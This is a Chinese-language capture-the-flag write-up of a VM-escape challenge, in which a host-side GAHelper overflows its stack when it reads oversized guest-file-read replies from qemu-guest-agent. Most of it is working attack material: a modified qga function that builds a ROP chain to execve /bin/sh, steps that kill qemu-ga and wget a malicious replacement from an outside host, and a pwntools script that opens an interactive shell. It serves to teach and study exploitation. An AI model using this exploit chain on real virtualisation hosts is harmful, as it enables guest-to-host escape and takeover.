## 漏洞成因
宿主机使用了GAHelper程序对qemu-guest-agent的返回进行处理，并与之交互。
GAHelper遵循了qemu-guest-agent的api规范，同时客户机内的默认qemu-ga是官方的qga客户端程序。
攻击者可以使用自定义的qemu-ga程序发送不符合api规范的报文返回给GAHelper，从而造成GAHepler崩溃以及任意代码执行。
本题提出了一个新的攻击面，该攻击面包含了vm-tools在vmware中造成的虚拟机逃逸，以及qga在qemu虚拟机中的虚拟机逃逸风险，是CTF比赛中的首次创新。

## 漏洞细节
```guest-file-read```的api约定如下
```
Command: guest-file-read
Read from an open file in the guest. Data will be base64-encoded

Arguments:

handle: int
filehandle returned by guest-file-open

count: int (optional)
maximum number of bytes to read (default is 4KB)

Returns: GuestFileRead on success.

Since: 0.15.0
```
首先，GAHelper认为，读取的文件长度必定小于制定的长度，以及返回的count必定是真实文件读取长度。
```
cJSON *read_root = cJSON_CreateObject();
cJSON *read_arguments = cJSON_CreateObject();
cJSON_AddItemToObject(read_root, "execute", cJSON_CreateString("guest-file-read"));
cJSON_AddItemToObject(read_arguments, "handle", cJSON_CreateNumber(handle_id));
cJSON_AddItemToObject(read_arguments, "count", cJSON_CreateNumber(0x1000));
cJSON_AddItemToObject(read_root, "arguments", read_arguments);
char *tmp = cJSON_Print(read_root);
if (tmp == NULL) {
  cJSON_Delete(read_root);
  free(file_path);
  return;
}
char *read_info = SendCommandReadRet(tmp);
```
从而造成了缓冲区溢出的漏洞
```
char b64dec_buf[0x1000] = {0};
if (buf_b64 != NULL) {
  base64_decode(buf_b64, strlen(buf_b64), b64dec_buf);
  printf( "content: %s\n", b64dec_buf);
}
```
尽管base64解码会缩短返回串长度，但是依然会造成栈溢出漏洞。
```
GuestFileRead *guest_file_read_unsafe(GuestFileHandle *gfh,
                                      int64_t count, Error **errp)
{
    GuestFileRead *read_data = NULL;
    guchar *buf;
    FILE *fh = gfh->fh;
    size_t read_count;

    /* explicitly flush when switching from writing to reading */
    if (gfh->state == RW_STATE_WRITING) {
        int ret = fflush(fh);
        if (ret == EOF) {
            error_setg_errno(errp, errno, "failed to flush file");
            return NULL;
        }
        gfh->state = RW_STATE_NEW;
    }

    if (count == 0x1000) { //payload 1
      size_t syscall_addr = 0x000000000040a14c;
      size_t pop_rdi      = 0x0000000000400636;
      size_t pop_rsi      = 0x000000000040ea95;
      size_t pop_rdx      = 0x0000000000454595;
      size_t pop_rax      = 0x000000000045453c;
      guchar *payload = g_malloc0(0x2070);
      memset(payload, '\x00', 0x2070);
      *(size_t *)(payload + 0x1078) = pop_rdi;
      *(size_t *)(payload + 0x1080) = 0;
      *(size_t *)(payload + 0x1088) = pop_rsi;
      *(size_t *)(payload + 0x1090) = 0x6caff0;
      *(size_t *)(payload + 0x1098) = pop_rdx;
      *(size_t *)(payload + 0x10a0) = 0x100;
      *(size_t *)(payload + 0x10a8) = 0x454580; //read
      *(size_t *)(payload + 0x10b0) = pop_rdi;
      *(size_t *)(payload + 0x10b8) = 0x6caff0;
      *(size_t *)(payload + 0x10c0) = pop_rsi;
      *(size_t *)(payload + 0x10c8) = 0;
      *(size_t *)(payload + 0x10d0) = pop_rdx;
      *(size_t *)(payload + 0x10d8) = 0;
      *(size_t *)(payload + 0x10e0) = pop_rax;
      *(size_t *)(payload + 0x10e8) = 59;
      *(size_t *)(payload + 0x10f0) = syscall_addr;
      read_data = g_new0(GuestFileRead, 1);
      read_data->count = 0x10f8;
      read_data->eof   = 0;
      int cnt = 0x10f8;
      read_data->buf_b64 = g_base64_encode(payload, cnt);
      return read_data;
    }
```
攻击者只需要伪造这个api实现函数，忽视读取长度，就可以实现栈溢出攻击。

## 攻击步骤
### 替换qemu-ga
杀死qga进程
```kill -9 pidof qemu-ga```
下载恶意qga
```wget ip:port/qemu-ga```
植入恶意qga
```./qemu-ga --daemonize -m virtio-serial -p /dev/vport0p1```
### 执行supervisor程序
```
from pwn import *

local=0
pc=''
aslr=True
context.log_level="debug"
context.terminal = ["deepin-terminal","-x","sh","-c"]

libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

if local==1:
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    p = process(pc,aslr=aslr)
    gdb.attach(p)
else:
    remote_addr=['127.0.0.1', 10007]
    p=remote(remote_addr[0],remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s):
    print('\033[1;31;40m{s}\033[0m'.format(s=s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

if __name__ == '__main__':
    ru("sock num > ")
    sn(str(sys.argv[1]))
    ru("Exit\n")
    pause()
    sl("2")
    ru("size > ")
    sl("256")
    ru("path > ")
    sn("/etc/passwd")
    ru("content: \n")
    sn("/bin/sh\x00")
    p.interactive()
```
